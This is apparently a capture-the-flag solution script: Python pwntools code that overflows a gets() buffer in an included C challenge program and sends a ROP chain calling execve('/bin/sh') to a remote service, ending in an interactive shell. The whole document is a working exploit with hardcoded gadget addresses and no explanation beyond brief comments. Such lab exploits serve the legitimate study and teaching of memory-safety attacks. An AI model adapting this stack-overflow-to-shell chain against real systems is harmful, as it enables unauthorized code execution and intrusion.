#!/usr/bin/env python3

from pwn import *

# r = process("./share/chal")
r = remote("10.113.184.121", 10052)

QQ = 0x00498008

pop_rax_ret = 0x0000000000450087
pop_rdi_ret = 0x0000000000401F0F
pop_rsi_ret = 0x0000000000409F7E
pop_rdx_rbx_ret = 0x0000000000485E0B
syscall = 0x0000000000401CC4
ret = 0x000000000040101A

rop_chain = b""

rop_chain += p64(pop_rax_ret) + p64(0x3B)  # execve
rop_chain += p64(pop_rdi_ret) + p64(QQ + 31)  # /bin/sh
rop_chain += p64(pop_rsi_ret) + p64(0x0)  # argv
rop_chain += p64(pop_rdx_rbx_ret) + p64(0x0) + p64(0x0)  # envp
rop_chain += p64(ret) + p64(syscall)

canary = b"C" * 0x0  # no canary?
old_rbp = b"B" * 0x8
payload = b"A" * 0x10 + canary + old_rbp + rop_chain

r.recvuntil(b"> ")
r.sendline(payload)

r.interactive()


"""
#include <stdio.h>

char *QQ = "QQ I don't have code to execve /bin/sh";

int main(void)
{
	setvbuf(stdin, 0, _IONBF, 0);
	setvbuf(stdout, 0, _IONBF, 0);
	puts(QQ);
	printf("> ");
	char buf[0x10];
	gets(buf);
	return 0;
}

"""
